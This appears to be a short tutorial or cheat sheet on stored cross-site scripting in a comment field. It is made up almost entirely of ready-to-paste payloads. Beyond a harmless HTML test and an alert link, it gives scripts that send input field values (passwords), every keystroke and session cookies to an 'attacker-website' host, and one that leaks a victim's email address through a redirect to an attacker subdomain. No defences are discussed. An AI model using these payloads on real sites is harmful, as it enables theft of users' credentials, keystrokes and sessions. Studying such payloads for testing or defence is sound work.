# Stored XSS Attack

A Stored XSS attack occurs when malicious code is permanently stored on the target server, such as in a database, comment field, or forum post. When a victim loads the affected page, the malicious script executes automatically.

## Test Scenario

- Vulnerable target: Comment function
- Use two browsers for testing: 
  - One as the attacker (to inject the payload)
  - One as the victim (to trigger the payload)

### 1. HTML Injection Test

Basic HTML injection to verify if HTML is rendered:

```html
<h1>test123</h1>
```

### 2. Stored XSS Payload (Clickable Link)

Stored payload that triggers `alert(document.domain)` when the victim clicks the link:

```html
<a href="javascript:alert(document.domain)">test123</a>
```

### 3. Stealing Passwords

Steals values from all `<input>` fields and sends them to the attacker's server:

```html
<script>
function logInputValues() {
    let inputData = document.getElementsByTagName("input");
    for (let input of inputData) {
        fetch("https://attacker-website/k?k=" + input.value);
    }
}
setTimeout(logInputValues, 2000);
</script>
```

### 4. Keylogger

Logs every key the victim presses and sends it to the attacker:

```html
<script>
function logKey(event) {
    fetch("https://attacker-website/?k=" + event.key);
}
document.addEventListener('keydown', logKey);
</script>
```

### 5. Stealing Cookies
Sends the victim's cookies to the attacker's server:

```html
<script>
var i = new Image();
i.src = "https://attacker-website/?" + document.cookie;
</script>
```

### 6. Stealing Gmail Account

Grabs an element with the ID email, modifies the address, and redirects to a malicious subdomain:

```html
<script>
var email = document.getElementById("email").innerText;
email = email.replace("@", "0");
email = email.replace(".", "x");
document.location = "http://" + email + ".attacker-website.com";
</script>
```